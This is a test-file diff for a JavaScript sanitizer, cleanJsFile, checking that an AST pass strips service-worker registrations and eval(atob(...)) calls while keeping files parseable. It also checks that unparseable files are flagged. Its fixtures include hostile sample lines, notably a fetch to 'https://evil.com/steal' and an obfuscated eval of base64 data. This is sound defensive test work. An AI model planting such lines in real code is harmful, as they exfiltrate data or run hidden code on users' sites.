@@ -55,3 +55,40 @@ describe('cleanJsFile — CJS-1: AST перепарсивается после e
     expect(parseJs(out, 'a.js')).not.toBeNull();
   });
 });
+
+describe('cleanJsFile — C7: SW/eval через AST (regex→AST)', () => {
+  it('SW-1: register(getURL()) удалён, JS остаётся валидным', async () => {
+    const out = await runClean(
+      `function getURL(){ return '/sw.js'; } navigator.serviceWorker.register(getURL()); console.log('ok');`,
+    );
+    expect(parseJs(out, 'a.js')).not.toBeNull(); // старый regex оставлял `);` → битый JS
+    expect(out).not.toContain('serviceWorker');
+    expect(out).toContain("console.log('ok')");
+  });
+
+  it('EVAL-2: var x = eval(atob(...)) нейтрализуется без поломки синтаксиса', async () => {
+    const out = await runClean(`var x = eval(atob('QQQQQQQQ')); console.log(x);`);
+    expect(parseJs(out, 'a.js')).not.toBeNull(); // старый regex оставлял `var x = ` → битый JS
+    expect(out).not.toContain('atob');
+    expect(out).toContain('console.log(x)');
+  });
+
+  it('CJS-4: кривой SW не делает файл непарсимым → exfil дальше ТОЖЕ вычищается', async () => {
+    // Старый порядок: regex SW ломал JS (register(getURL()) → `);`) → parseJs падал →
+    // advanced-детекторы пропускались → fetch на evil.com выживал. Теперь — AST.
+    const out = await runClean(
+      `navigator.serviceWorker.register(getURL()); fetch('https://evil.com/steal');`,
+    );
+    expect(parseJs(out, 'a.js')).not.toBeNull();
+    expect(out).not.toContain('serviceWorker');
+    expect(out).not.toContain('evil.com');
+  });
+
+  it('CJS-3: непарсимый JS флагается (JS_NOT_ANALYZED), а не глотается тишиной', async () => {
+    const file = join(tmp, 'broken.js');
+    await writeFile(file, `function ( { this is not valid js >>> `, 'utf8');
+    const log: ChangelogEntry[] = [];
+    await cleanJsFile(file, 'broken.js', log, 'mysite.com', true);
+    expect(log.some((e) => e.type === 'JS_NOT_ANALYZED')).toBe(true);
+  });
+});
